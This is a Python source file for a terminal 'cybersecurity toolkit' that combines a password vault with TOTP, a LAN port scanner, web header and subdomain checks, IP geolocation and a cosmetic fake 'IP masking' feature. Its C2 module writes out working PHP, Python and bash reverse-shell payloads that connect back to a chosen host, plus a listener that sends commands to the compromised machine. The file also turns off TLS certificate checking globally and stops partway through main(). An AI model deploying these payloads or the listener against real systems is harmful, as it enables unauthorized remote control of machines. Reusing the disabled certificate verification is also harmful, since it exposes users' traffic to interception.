#!/usr/bin/env python3
"""
ALPHA-SENTINEL: Elite Cybersecurity Toolkit
Project SPIFFY - Swiss Army Knife for Vulnerability Assessment

Architecture: Asyncio-based high-performance networking
Security: Scrypt hashing, TOTP 2FA, encrypted vault
Modules: RECON, AUDIT, TRACE, MASK, ACCESS, VAULT
"""

import sqlite3
import logging
import hashlib
import hmac
import os
import sys
import time
import re
import getpass
import random
import string
import urllib.request
import urllib.parse
import urllib.error
import ssl
import socket
import asyncio
import json
import threading
from contextlib import contextmanager
from datetime import datetime, timedelta
from typing import Optional, Tuple, List, Dict, Any, Union

# Import existing security modules
from security_utils import PasswordPolicyEnforcer, InputSanitizer, TOTPGenerator
from db_auditor import SystemAuditor, LogAnalyzer

# Configuration Constants
DB_FILE = "alpha_sentinel.db"
LOG_FILE = "alpha_sentinel.log"
MAX_LOGIN_ATTEMPTS = 5
LOCKOUT_DURATION_MINUTES = 15
NET_CONCURRENCY_LIMIT = 100
API_TIMEOUT = 5

# ANSI Color Codes for Advanced TUI
C_GREEN = "\033[38;5;46m"
C_D_GREEN = "\033[38;5;22m"
C_CYAN = "\033[38;5;81m"
C_YELLOW = "\033[38;5;220m"
C_RED = "\033[38;5;196m"
C_MAGENTA = "\033[38;5;171m"
C_WHITE = "\033[38;5;255m"
C_GRAY = "\033[38;5;240m"
C_BOLD = "\033[1m"
C_END = "\033[0m"
C_CLEAR = "\033[H\033[J"

# SSL Context for HTTPS requests
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

# Logging Configuration
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s [%(levelname)s] %(message)s',
    handlers=[logging.FileHandler(LOG_FILE)]
)


class DatabaseManager:
    """
    Core database manager with scrypt hashing and TOTP 2FA integration.
    Implements atomic transactions and foreign key constraints.
    """
    
    def __init__(self, db_path: str = DB_FILE):
        self.db_path = db_path
        self._initialize_infrastructure()
    
    @contextmanager
    def get_connection(self):
        """Context manager for database connections with foreign key support."""
        conn = sqlite3.connect(self.db_path, timeout=20)
        conn.row_factory = sqlite3.Row
        conn.execute("PRAGMA foreign_keys = ON")
        try:
            yield conn
        finally:
            conn.close()
    
    def _initialize_infrastructure(self):
        """Initialize database schema with users and secrets tables."""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            
            # Users table with TOTP support
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    username TEXT UNIQUE NOT NULL,
                    password_hash BLOB NOT NULL,
                    salt BLOB NOT NULL,
                    failed_attempts INTEGER DEFAULT 0,
                    lockout_until TIMESTAMP,
                    totp_secret TEXT,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
            ''')
            
            # Secrets vault table
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS secrets (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER NOT NULL,
                    title TEXT NOT NULL,
                    website TEXT,
                    username_ref TEXT,
                    secret_value TEXT NOT NULL,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    FOREIGN KEY (user_id) REFERENCES users (id) ON DELETE CASCADE
                )
            ''')
            
            cursor.execute('CREATE INDEX IF NOT EXISTS idx_user_id ON secrets(user_id)')
            conn.commit()
            logging.info("Database infrastructure initialized")
    
    def _hash_password(self, password: str, salt: bytes = None) -> Tuple[bytes, bytes]:
        """Hash password using scrypt (n=16384, r=8, p=1)."""
        if salt is None:
            salt = os.urandom(16)
        pw_hash = hashlib.scrypt(password.encode(), salt=salt, n=16384, r=8, p=1)
        return pw_hash, salt
    
    def register_user(self, username: str, password: str) -> Tuple[bool, str, Optional[str]]:
        """
        Register new user with password policy enforcement and TOTP setup.
        
        Returns:
            Tuple of (success: bool, message: str, totp_uri: Optional[str])
        """
        if not username or not password:
            return False, "ERROR: Input validation failed", None
        
        # Validate username
        sanitizer = InputSanitizer()
        valid, msg = sanitizer.validate_username(username)
        if not valid:
            return False, msg, None
        
        # Enforce password policy
        policy = PasswordPolicyEnforcer()
        strong, msg = policy.check_strength(password)
        if not strong:
            return False, msg, None
        
        # Generate TOTP secret for 2FA
        totp_gen = TOTPGenerator()
        totp_secret = totp_gen.generate_secret()
        totp_uri = totp_gen.generate_qr_code(username, totp_secret)
        
        pw_hash, salt = self._hash_password(password)
        
        with self.get_connection() as conn:
            try:
                conn.execute(
                    "INSERT INTO users (username, password_hash, salt, totp_secret) VALUES (?, ?, ?, ?)",
                    (username, pw_hash, salt, totp_secret)
                )
                conn.commit()
                logging.info(f"New user registered: {username}")
                return True, "SUCCESS: Identity matrix initialized", totp_uri
            except sqlite3.IntegrityError:
                return False, "ERROR: Identity already exists in kernel", None
    
    def login(self, username: str, password: str, totp_token: str = None) -> Tuple[Optional[int], str]:
        """
        Authenticate user with password and TOTP 2FA.
        
        Returns:
            Tuple of (user_id: Optional[int], message: str)
        """
        now = datetime.now()
        
        with self.get_connection() as conn:
            cursor = conn.cursor()
            cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
            user = cursor.fetchone()
            
            if not user:
                logging.warning(f"Failed login attempt for non-existent user: {username}")
                return None, "FAIL: Access denied"
            
            # Check lockout status
            if user['lockout_until']:
                if now < datetime.fromisoformat(user['lockout_until']):
                    logging.warning(f"Login attempt for locked account: {username}")
                    return None, "LOCKOUT: Protocol active"
            
            # Verify password
            ph, _ = self._hash_password(password, user['salt'])
            if not hmac.compare_digest(user['password_hash'], ph):
                nf = user['failed_attempts'] + 1
                lts = (now + timedelta(minutes=LOCKOUT_DURATION_MINUTES)).isoformat() if nf >= MAX_LOGIN_ATTEMPTS else None
                conn.execute(
                    "UPDATE users SET failed_attempts = ?, lockout_until = ? WHERE username = ?",
                    (nf, lts, username)
                )
                conn.commit()
                logging.warning(f"Failed login attempt for {username} ({nf}/{MAX_LOGIN_ATTEMPTS})")
                return None, f"FAIL: Credentials mismatch ({nf}/{MAX_LOGIN_ATTEMPTS})"
            
            # Verify TOTP if user has it set up
            if user['totp_secret']:
                if not totp_token:
                    return None, "2FA_REQUIRED"
                
                totp_gen = TOTPGenerator()
                if not totp_gen.verify_token(user['totp_secret'], totp_token):
                    nf = user['failed_attempts'] + 1
                    lts = (now + timedelta(minutes=LOCKOUT_DURATION_MINUTES)).isoformat() if nf >= MAX_LOGIN_ATTEMPTS else None
                    conn.execute(
                        "UPDATE users SET failed_attempts = ?, lockout_until = ? WHERE username = ?",
                        (nf, lts, username)
                    )
                    conn.commit()
                    logging.warning(f"Failed 2FA attempt for {username} ({nf}/{MAX_LOGIN_ATTEMPTS})")
                    return None, f"FAIL: 2FA token invalid ({nf}/{MAX_LOGIN_ATTEMPTS})"
            
            # Successful login
            conn.execute(
                "UPDATE users SET failed_attempts = 0, lockout_until = NULL WHERE username = ?",
                (username,)
            )
            conn.commit()
            logging.info(f"Successful login: {username}")
            return user['id'], "SUCCESS"
    
    def add_secret(self, user_id: int, title: str, website: str, user_ref: str, value: str):
        """Add secret to user's vault with atomic transaction."""
        with self.get_connection() as conn:
            conn.execute(
                "INSERT INTO secrets (user_id, title, website, username_ref, secret_value) VALUES (?, ?, ?, ?, ?)",
                (user_id, title, website, user_ref, value)
            )
            conn.commit()
            logging.info(f"Secret added for user_id {user_id}: {title}")
    
    def get_secrets(self, user_id: int, search: str = "") -> List[sqlite3.Row]:
        """Retrieve user's secrets with optional search filter."""
        with self.get_connection() as conn:
            cursor = conn.cursor()
            if search:
                cursor.execute(
                    "SELECT * FROM secrets WHERE user_id = ? AND (title LIKE ? OR website LIKE ?)",
                    (user_id, f"%{search}%", f"%{search}%")
                )
            else:
                cursor.execute("SELECT * FROM secrets WHERE user_id = ?", (user_id,))
            return cursor.fetchall()


class GhostProtocol:
    """
    Ghost Protocol simulator for virtual IP masking.
    Implements timed sessions with identity purging.
    """
    
    def __init__(self):
        self.active = False
        self.virtual_ip = None
        self.expiry_time = None
    
    def establish_session(self, duration_mins: int = 20) -> str:
        """Generate virtual IP and establish timed session."""
        self.virtual_ip = f"{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}"
        self.expiry_time = datetime.now() + timedelta(minutes=duration_mins)
        self.active = True
        logging.info(f"Ghost Protocol established: {self.virtual_ip} (expires in {duration_mins}m)")
        return self.virtual_ip
    
    def is_active(self) -> bool:
        """Check if session is still active."""
        if self.active and datetime.now() > self.expiry_time:
            self.purge_identity()
            return False
        return self.active
    
    def get_remaining_time(self) -> str:
        """Get remaining session time in MM:SS format."""
        if not self.active:
            return "00:00"
        rem = self.expiry_time - datetime.now()
        secs = int(rem.total_seconds())
        return f"{max(0, secs // 60):02d}:{max(0, secs % 60):02d}"
    
    def purge_identity(self):
        """Purge virtual identity and cleanup session."""
        if self.virtual_ip:
            logging.info(f"Ghost Protocol purged: {self.virtual_ip}")
        self.active = False
        self.virtual_ip = None
        self.expiry_time = None


class C2CommandCenter:
    """
    Command & Control center for payload generation and reverse shell listening.
    """
    
    @staticmethod
    def generate_payload(lhost: str, lport: int, payload_type: str) -> str:
        """Generate reverse shell payload for specified language."""
        payloads = {
            "php": f"<?php exec(\"/bin/bash -c 'bash -i >&/dev/tcp/{lhost}/{lport} 0>&1'\"); ?>",
            "python": f"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
            "bash": f"bash -i >&/dev/tcp/{lhost}/{lport} 0>&1"
        }
        return payloads.get(payload_type, payloads["bash"])
    
    @staticmethod
    def listen(port: int, status_callback):
        """Start async reverse shell listener."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                s.bind(('0.0.0.0', port))
                s.listen(1)
                status_callback(f"LISTENING ON PORT {port}...")
                s.settimeout(60)
                
                try:
                    conn, addr = s.accept()
                    with conn:
                        status_callback(f"UPLINK ESTABLISHED: {addr[0]}")
                        while True:
                            cmd = input(f"{C_RED}SHELL@ALPHA:~# {C_END}").strip()
                            if cmd.lower() in ['exit', 'quit']:
                                break
                            if not cmd:
                                continue
                            conn.sendall(cmd.encode() + b'\n')
                            data = conn.recv(4096)
                            if not data:
                                break
                            print(C_WHITE + data.decode(errors='ignore') + C_END)
                except socket.timeout:
                    status_callback("TIMEOUT: Signal expired (60s)")
        except ConnectionRefusedError:
            status_callback("CONNECTION_REFUSED: Target unreachable")
        except OSError as e:
            status_callback(f"OS_ERROR: {str(e)}")
        except Exception as e:
            status_callback(f"CRITICAL: {type(e).__name__}: {str(e)}")


class AsyncNetworkEngine:
    """
    High-performance async networking engine with semaphore-based concurrency control.
    """
    
    def __init__(self, concurrency_limit: int = NET_CONCURRENCY_LIMIT):
        self.semaphore = asyncio.Semaphore(concurrency_limit)
        self.timeout = API_TIMEOUT
    
    async def probe_port(self, host: str, port: int) -> Optional[int]:
        """Async port probe with timeout and semaphore control."""
        async with self.semaphore:
            try:
                _, writer = await asyncio.wait_for(
                    asyncio.open_connection(host, port),
                    timeout=0.8
                )
                writer.close()
                await writer.wait_closed()
                return port
            except (asyncio.TimeoutError, ConnectionRefusedError, OSError):
                return None
    
    async def scan_network_topology(self) -> List[Dict[str, str]]:
        """
        Module [RECON]: WiFi network topology scanner.
        Scans local network for active devices with hostname resolution.
        """
        local_ip = self._get_local_ip()
        if local_ip == '127.0.0.1':
            return []
        
        prefix = ".".join(local_ip.split(".")[:-1]) + "."
        common_ports = [80, 443, 22, 135, 445, 62078]
        
        async def check_device(ip: str) -> Optional[Dict[str, str]]:
            """Check if device is active and resolve hostname."""
            for port in common_ports:
                if await self.probe_port(ip, port):
                    try:
                        loop = asyncio.get_event_loop()
                        name, _, _ = await loop.run_in_executor(None, socket.gethostbyaddr, ip)
                        tag = ""
                        if ip == local_ip:
                            tag = " [THIS DEVICE]"
                        elif ip.endswith(".1"):
                            tag = " [PRIMARY GATEWAY]"
                        return {"ip": ip, "name": name + tag}
                    except:
                        tag = ""
                        if ip == local_ip:
                            tag = " [THIS DEVICE]"
                        elif ip.endswith(".1"):
                            tag = " [PRIMARY GATEWAY]"
                        return {"ip": ip, "name": "Active Device" + tag}
            return None
        
        tasks = [check_device(f"{prefix}{i}") for i in range(1, 255)]
        results = await asyncio.gather(*tasks)
        return [r for r in results if r]
    
    def _get_local_ip(self) -> str:
        """Get local IP address."""
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(('8.8.8.8', 1))
            return s.getsockname()[0]
        except:
            return '127.0.0.1'
        finally:
            s.close()
    
    async def deep_audit_target(self, url: str) -> Dict[str, Any]:
        """
        Module [AUDIT]: Deep web security auditor.
        Checks CMS, headers, RCE vectors, and enumerates subdomains.
        """
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        
        report = {
            "status": "Error",
            "cms": "Unknown",
            "server": "Unknown",
            "risks": [],
            "headers": {},
            "subdomains": []
        }
        
        try:
            req = urllib.request.Request(url, headers={'User-Agent': 'AlphaSentinel/2.0'})
            with urllib.request.urlopen(req, timeout=self.timeout, context=ssl_context) as res:
                report["status"] = res.getcode()
                headers = res.info()
                report["server"] = headers.get("Server", "Hidden")
                
                # Security headers check
                for header in ["Content-Security-Policy", "X-Frame-Options", "Strict-Transport-Security"]:
                    report["headers"][header] = "ACTIVE" if header in headers else "MISSING"
                
                # CMS detection
                content = res.read().decode('utf-8', errors='ignore').lower()
                if any(x in content for x in ['wp-content', 'wordpress']):
                    report['cms'] = "WordPress"
                elif 'drupal' in content:
                    report['cms'] = "Drupal"
                elif 'joomla' in content:
                    report['cms'] = "Joomla"
                
                # RCE vector detection
                if 'type="file"' in content:
                    report['risks'].append("RCE Vector: File upload detected")
                if 'id=' in url or '?' in url:
                    report['risks'].append("SQLi Risk: Dynamic parameters detected")
        
        except asyncio.TimeoutError:
            report["status"] = "TIMEOUT: Remote node unresponsive (>5s)"
        except urllib.error.HTTPError as e:
            report["status"] = f"HTTP_ERROR: {e.code} {e.reason}"
        except urllib.error.URLError as e:
            report["status"] = f"URL_ERROR: {str(e.reason)}"
        except Exception as e:
            report["status"] = f"CRITICAL: {type(e).__name__}: {str(e)}"
        
        # Subdomain enumeration
        domain = urllib.parse.urlparse(url).netloc if '://' in url else url
        report["subdomains"] = await self._enumerate_subdomains(domain)
        
        return report
    
    async def _enumerate_subdomains(self, domain: str) -> List[str]:
        """Enumerate common subdomains asynchronously."""
        prefixes = ["www", "mail", "dev", "test", "api", "admin", "vpn", "portal", "ftp", "staging"]
        found = []
        
        async def check_subdomain(prefix: str):
            async with self.semaphore:
                target = f"{prefix}.{domain}"
                try:
                    loop = asyncio.get_event_loop()
                    await loop.getaddrinfo(target, None)
                    found.append(target)
                except:
                    pass
        
        tasks = [check_subdomain(p) for p in prefixes]
        await asyncio.gather(*tasks)
        return found


class CascadingFailover:
    """
    Triple-redundancy failover system for geolocation APIs.
    Implements Primary → Secondary → Tertiary → Local diagnostic pattern.
    """
    
    def __init__(self):
        self.apis = [
            ("https://ipwho.is/", "success", "ipwho.is"),
            ("https://ipapi.co/", "city", "ipapi.co"),
            ("http://ip-api.com/json/", "status", "ip-api.com")
        ]
    
    async def geolocate_target(self, ip: str = "") -> Dict[str, Any]:
        """
        Module [TRACE]: Geolocation engine with cascading failover.
        Tries three APIs in sequence, falls back to local diagnostic.
        """
        target = ip.strip() if ip else ""
        
        for base_url, check_field, node_name in self.apis:
            try:
                url = f"{base_url}{target}"
                if "ip-api.com" in url:
                    url += "?fields=status,message,country,regionName,city,lat,lon,isp,query"
                
                req = urllib.request.Request(url, headers={'User-Agent': 'AlphaSentinel/2.0'})
                with urllib.request.urlopen(req, timeout=API_TIMEOUT) as res:
                    data = json.loads(res.read().decode())
                    
                    if data.get(check_field) in ["success", True] or data.get(check_field) is not None:
                        logging.info(f"Geolocation successful via {node_name}")
                        return {
                            "status": "success",
                            "ip": data.get("ip") or data.get("query") or target,
                            "city": data.get("city") or data.get("regionName") or "Unknown",
                            "country": data.get("country") or data.get("country_name") or "Unknown",
                            "isp": data.get("connection", {}).get("isp") or data.get("isp") or data.get("org") or "Unknown",
                            "lat": data.get("latitude") or data.get("lat"),
                            "lon": data.get("longitude") or data.get("lon"),
                            "node": node_name
                        }
            except asyncio.TimeoutError:
                logging.warning(f"Geolocation timeout on {node_name}")
                continue
            except urllib.error.HTTPError as e:
                logging.warning(f"Geolocation HTTP error on {node_name}: {e.code}")
                continue
            except Exception as e:
                logging.warning(f"Geolocation error on {node_name}: {type(e).__name__}")
                continue
        
        # All APIs failed - return local diagnostic
        logging.error("All geolocation APIs failed, returning local diagnostic")
        return {
            "status": "fail",
            "message": "CRITICAL: All trace nodes unresponsive (Primary/Secondary/Tertiary failed)",
            "diagnostic": "Check network connectivity or API rate limits"
        }


class AdvancedTUI:
    """
    Advanced Terminal User Interface with Unicode box-drawing and animations.
    """
    
    def __init__(self, db_manager: DatabaseManager):
        self.db = db_manager
        self.ghost = GhostProtocol()
        self.network_engine = AsyncNetworkEngine()
        self.failover = CascadingFailover()
        self.c2 = C2CommandCenter()
        self.running = True
        self.uid = None
    
    def clear(self):
        """Clear terminal screen."""
        print(C_CLEAR, end="")
    
    def type_text(self, text: str, delay: float = 0.01, color: str = C_GREEN):
        """Typewriter effect for text output."""
        for char in text:
            sys.stdout.write(color + char + C_END)
            sys.stdout.flush()
            time.sleep(delay)
        print()
    
    def draw_box(self, lines: List[str], title: str = "", color: str = C_CYAN):
        """Draw Unicode box around content."""
        if not lines:
            return
        
        width = max(len(str(line)) for line in lines) + 4
        if title:
            width = max(width, len(title) + 4)
        
        print(color + "┏" + ("━" * (width - 2)) + "┓" + C_END)
        
        if title:
            print(color + "┃ " + C_BOLD + title.center(width - 4) + C_END + color + " ┃" + C_END)
            print(color + "┣" + ("━" * (width - 2)) + "┫" + C_END)
        
        for line in lines:
            print(color + "┃ " + C_WHITE + str(line).ljust(width - 4) + C_END + color + " ┃" + C_END)
        
        print(color + "┗" + ("━" * (width - 2)) + "┛" + C_END)
    
    def boot_sequence(self):
        """Technical boot sequence with progress indicators."""
        self.clear()
        logs = [
            "ALPHA-SENTINEL KERNEL V2.0 INITIALIZING...",
            "MOUNTING ENCRYPTED SQLITE NODES...",
            "CALIBRATING ASYNC NETWORK DRIVERS...",
            "LINKING SATELLITE GEOLOCATION BRIDGE...",
            "GHOST PROTOCOL SIMULATOR: LOADED",
            "C2 COMMAND INFRASTRUCTURE: ARMED",
            "SYSTEM READY. ESTABLISHING ENCRYPTED SHELL."
        ]
        
        for log in logs:
            self.type_text(f"[OK] {log}", delay=0.005, color=C_D_GREEN)
            time.sleep(0.08)
        
        time.sleep(0.5)
    
    def draw_banner(self):
        """Display main banner with system status."""
        banner = r"""
   ╔═╗╦  ╔═╗╦ ╦╔═╗   ╔═╗╔═╗╔╗╔╔╦╗╦╔╗╔╔═╗╦  
   ╠═╣║  ╠═╝╠═╣╠═╣───╚═╗║╣ ║║║ ║ ║║║║║╣ ║  
   ╩ ╩╩═╝╩  ╩ ╩╩ ╩   ╚═╝╚═╝╝╚╝ ╩ ╩╝╚╝╚═╝╩═╝
        """
        print(C_GREEN + C_BOLD + banner + C_END)
        
        status = f"GHOST: {self.ghost.virtual_ip} [{self.ghost.get_remaining_time()}]" if self.ghost.is_active() else "GRID: ONLINE"
        print(C_GRAY + f" ELITE CYBERSECURITY TOOLKIT | {datetime.now().strftime('%H:%M:%S')} | {status}".center(65) + C_END + "\n")
    
    def glitch_decrypt(self, target: str, duration: float = 0.6):
        """High-speed glitch decryption animation."""
        chars = string.ascii_letters + string.digits + "!@#$%^&*"
        display = list(" " * len(target))
        end_time = time.time() + duration
        
        while time.time() < end_time:
            for i in range(len(target)):
                if random.random() > 0.9:
                    display[i] = target[i]
                else:
                    display[i] = random.choice(chars)
            sys.stdout.write(f"\r{C_YELLOW}{''.join(display)}{C_END}")
            sys.stdout.flush()
            time.sleep(0.02)
        
        sys.stdout.write(f"\r{C_GREEN}{C_BOLD}{target}{C_END}\n")
    
    def show_spinner(self, duration: float = 1.0, text: str = "PROBING"):
        """Animated spinner with custom text."""
        chars = "█▓▒░"
        end_time = time.time() + duration
        
        while time.time() < end_time:
            sys.stdout.write(f"\r{C_GREEN}[{random.choice(chars)}] {text}...{C_END}")
            sys.stdout.flush()
            time.sleep(0.08)
        
        sys.stdout.write("\r" + (" " * (len(text) + 40)) + "\r")
    
    def main_menu(self):
        """Main application menu loop."""
        self.boot_sequence()
        
        while self.running:
            self.clear()
            self.draw_banner()
            
            menu_items = [
                "[1] ENROLL IDENTITY",
                "[2] ACCESS VAULT",
                "[3] TRACE IP (GEOLOCATION)",
                "[4] AUDIT INFRASTRUCTURE",
                "[5] RECON NETWORK (WIFI RADAR)",
                "[6] GHOST PROTOCOL (MASK)",
                "[7] C2 COMMAND CENTER",
                "[8] SECURITY AUDIT (SYSTEM)",
                "[0] SHUTDOWN"
            ]
            
            self.draw_box(menu_items, "ALPHA-SENTINEL CORE")
            
            choice = input(f"\n{C_CYAN}ALPHA@ROOT:# {C_END}").strip()
            
            if choice == "1":
                self.handle_registration()
            elif choice == "2":
                self.handle_login()
            elif choice == "3":
                asyncio.run(self.handle_trace())
            elif choice == "4":
                asyncio.run(self.handle_audit())
            elif choice == "5":
                asyncio.run(self.handle_recon())
            elif choice == "6":
                self.handle_ghost_protocol()
            elif choice == "7":
                self.handle_c2()
            elif choice == "8":
                self.handle_security_audit()
            elif choice == "0":
                self.running = False
    
    def handle_registration(self):
        """Handle user registration with 2FA setup."""
        self.clear()
        self.draw_banner()
        print(f"{C_CYAN}═══ IDENTITY ENROLLMENT ═══{C_END}\n")
        
        username = input("UID: ")
        password = getpass.getpass("KEY: ")
        
        success, message, totp_uri = self.db.register_user(username, password)
        
        if success:
            print(f"{C_GREEN}{message}{C_END}\n")
            if totp_uri:
                print(f"{C_YELLOW}═══ 2FA SETUP REQUIRED ═══{C_END}")
                print(f"{C_WHITE}Scan this QR code with your authenticator app:{C_END}\n")
                
                # Display QR code
                totp_gen = TOTPGenerator()
                try:
                    secret = totp_uri.split('secret=')[1].split('&')[0]
                    qr_ascii = totp_gen.generate_qr_ascii(username, secret)
                    print(f"{C_GREEN}{qr_ascii}{C_END}\n")
                except:
                    pass
                
                print(f"{C_CYAN}Or manually enter this URI:{C_END}")
                print(f"{C_WHITE}{totp_uri}{C_END}\n")
                print(f"{C_YELLOW}Backup secret key:{C_END}")
                try:
                    secret = totp_uri.split('secret=')[1].split('&')[0]
                    print(f"{C_WHITE}{secret}{C_END}\n")
                except:
                    pass
        else:
            print(f"{C_RED}{message}{C_END}")
        
        input("\nPress ENTER to continue...")
    
    def handle_login(self):
        """Handle user login with 2FA."""
        self.clear()
        self.draw_banner()
        print(f"{C_CYAN}═══ VAULT ACCESS ═══{C_END}\n")
        
        username = input("UID: ")
        password = getpass.getpass("KEY: ")
        
        uid, message = self.db.login(username, password)
        
        if message == "2FA_REQUIRED":
            print(f"{C_YELLOW}2FA Token Required{C_END}")
            totp_token = input("Enter 6-digit code from authenticator: ").strip()
            uid, message = self.db.login(username, password, totp_token)
        
        if uid:
            self.uid = uid
            self.vault_loop(username)
        else:
            print(f"{C_RED}{message}{C_END}")
            time.sleep(2)
    
    def vault_loop(self, username: str):
        """Vault management loop."""
        while True:
            self.clear()
            self.draw_banner()
            self.draw_box(
                ["1. QUERY SECRETS", "2. APPEND SECRET", "3. DISCONNECT"],
                f"VAULT: {username.upper()}"
            )
            
            choice = input(f"{C_GREEN}{username}@VAULT:$ {C_END}").strip()
            
            if choice == "1":
                secrets = self.db.get_secrets(self.uid)
                if secrets:
                    for secret in secrets:
                        print(f"{C_CYAN}{secret['title']}{C_END}")
                        sys.stdout.write(" KEY: ")
                        self.glitch_decrypt(secret['secret_value'])
                else:
                    print(f"{C_YELLOW}No secrets stored{C_END}")
                input("\nPress ENTER...")
            elif choice == "2":
                title = input("TITLE: ")
                website = input("WEBSITE: ")
                user_ref = input("USERNAME: ")
                password = input("PASSWORD: ")
                self.db.add_secret(self.uid, title, website, user_ref, password)
                print(f"{C_GREEN}Secret stored{C_END}")
                time.sleep(1)
            elif choice == "3":
                break
    
    async def handle_trace(self):
        """Module [TRACE]: IP geolocation with cascading failover."""
        self.clear()
        self.draw_banner()
        
        ip = input("TARGET IP (Leave empty for self): ").strip()
        self.show_spinner(1.0, "ESTABLISHING SIGNAL")
        
        result = await self.failover.geolocate_target(ip)
        
        if result["status"] == "success":
            self.draw_box([
                f"IP: {result['ip']}",
                f"LOCATION: {result['city']}, {result['country']}",
                f"ISP: {result['isp']}",
                f"COORDINATES: {result.get('lat', 'N/A')}, {result.get('lon', 'N/A')}",
                f"NODE: {result['node']}"
            ], "GEOLOCATION DATA", C_GREEN)
        else:
            print(f"{C_RED}CRITICAL: {result['message']}{C_END}")
            if 'diagnostic' in result:
                print(f"{C_YELLOW}DIAGNOSTIC: {result['diagnostic']}{C_END}")
        
        input("\nPress ENTER...")
    
    async def handle_audit(self):
        """Module [AUDIT]: Deep web security audit."""
        self.clear()
        self.draw_banner()
        
        url = input("TARGET URL: ").strip()
        self.show_spinner(1.2, "DEEP SCANNING")
        
        result = await self.network_engine.deep_audit_target(url)
        
        report_lines = [
            f"STATUS: {result['status']}",
            f"CMS: {result['cms']}",
            f"SERVER: {result['server']}",
            "",
            "SECURITY HEADERS:"
        ]
        
        for header, status in result['headers'].items():
            color = C_GREEN if status == "ACTIVE" else C_RED
            report_lines.append(f"  {header}: {color}{status}{C_END}")
        
        if result['risks']:
            report_lines.append("")
            report_lines.append("RISK VECTORS:")
            for risk in result['risks']:
                report_lines.append(f"  {C_RED}⚠{C_END} {risk}")
        
        self.draw_box(report_lines, "AUDIT REPORT", C_YELLOW)
        
        if result['subdomains']:
            self.draw_box(result['subdomains'], "DISCOVERED SUBDOMAINS", C_MAGENTA)
        
        input("\nPress ENTER...")
    
    async def handle_recon(self):
        """Module [RECON]: Network topology scanner."""
        self.clear()
        self.draw_banner()
        
        local_ip = self.network_engine._get_local_ip()
        self.draw_box([
            f"SOURCE DEVICE: {local_ip}",
            "SCANNING NETWORK TOPOLOGY..."
        ], "WIFI RADAR", C_MAGENTA)
        
        self.show_spinner(2.5, "INTERCEPTING PACKETS")
        
        devices = await self.network_engine.scan_network_topology()
        
        device_list = [f"{d['ip']} → {d['name']}" for d in devices]
        self.draw_box(
            device_list if device_list else ["NO EXTERNAL DEVICES FOUND"],
            f"{len(devices)} NODES ON NETWORK",
            C_GREEN
        )
        
        input("\nPress ENTER...")
    
    def handle_ghost_protocol(self):
        """Module [MASK]: Ghost Protocol virtual IP simulator."""
        if not self.ghost.is_active():
            vip = self.ghost.establish_session(20)
            print(f"{C_CYAN}GHOST PROTOCOL ESTABLISHED: {vip}{C_END}")
            print(f"{C_YELLOW}Session expires in 20 minutes{C_END}")
        else:
            print(f"{C_GREEN}STATUS: {self.ghost.virtual_ip} [ACTIVE]{C_END}")
            print(f"{C_YELLOW}Remaining: {self.ghost.get_remaining_time()}{C_END}")
        
        time.sleep(2)
    
    def handle_c2(self):
        """Module [ACCESS]: C2 Command & Control center."""
        self.clear()
        self.draw_banner()
        self.draw_box(["1. GENERATE PAYLOAD", "2. START LISTENER"], "C2 COMMAND CENTER")
        
        choice = input("> ").strip()
        
        if choice == "1":
            lhost = input("LHOST: ")
            lport = input("LPORT: ")
            ptype = input("TYPE (php/python/bash): ")
            payload = self.c2.generate_payload(lhost, int(lport), ptype)
            print(f"\n{C_YELLOW}{payload}{C_END}")
        elif choice == "2":
            port = input("PORT: ")
            self.c2.listen(int(port), lambda m: print(f"{C_YELLOW}[SYSTEM] {m}{C_END}"))
        
        input("\nPress ENTER...")
    
    def handle_security_audit(self):
        """Run system security audit."""
        self.clear()
        self.draw_banner()
        
        print(f"{C_CYAN}Running security audit...{C_END}\n")
        
        # Database permission check
        auditor = SystemAuditor()
        is_secure, report = auditor.check_db_permissions(DB_FILE)
        
        if is_secure:
            print(f"{C_GREEN}✓ Database permissions: SECURE{C_END}")
        else:
            print(f"{C_RED}✗ Database permissions: INSECURE{C_END}")
            print(f"{C_YELLOW}{report}{C_END}")
        
        print()
        
        # Log analysis
        analyzer = LogAnalyzer()
        suspicious = analyzer.scan_for_suspicious_activity(LOG_FILE)
        
        if suspicious:
            print(f"{C_RED}⚠ Found {len(suspicious)} suspicious event(s){C_END}")
            for event in suspicious[:3]:
                print(f"  - {event['type']}: {event['description'][:60]}...")
        else:
            print(f"{C_GREEN}✓ No suspicious activity detected{C_END}")
        
        input("\nPress ENTER...")


def main():
    """
    Main entry point with comprehensive security initialization.
    """
    print(f"{C_CLEAR}{C_GREEN}{C_BOLD}")
    print("=" * 70)
    print("  ALPHA-SENTINEL: ELITE CYBERSECURITY TOOLKIT")
    print("=" * 70)
    print(C_END)
    
    # Initialize database
    print(f"{C_CYAN}[1/3] Initializing Database...{C_END}")
    db = DatabaseManager()
    print(f"{C_GREEN}  ✓ Database initialized{C_END}\n")
    time.sleep(0.3)
    
    # Run security audit
    print(f"{C_CYAN}[2/3] Auditing System Security...{C_END}")
    auditor = SystemAuditor()
    is_secure, report = auditor.check_db_permissions(DB_FILE)
    
    if is_secure:
        print(f"{C_GREEN}  ✓ Database permissions: SECURE{C_END}")
    else:
        print(f"{C_RED}  ✗ Database permissions: INSECURE{C_END}")
    print()
    time.sleep(0.3)
    
    # Analyze logs
    print(f"{C_CYAN}[3/3] Scanning Audit Logs...{C_END}")
    analyzer = LogAnalyzer()
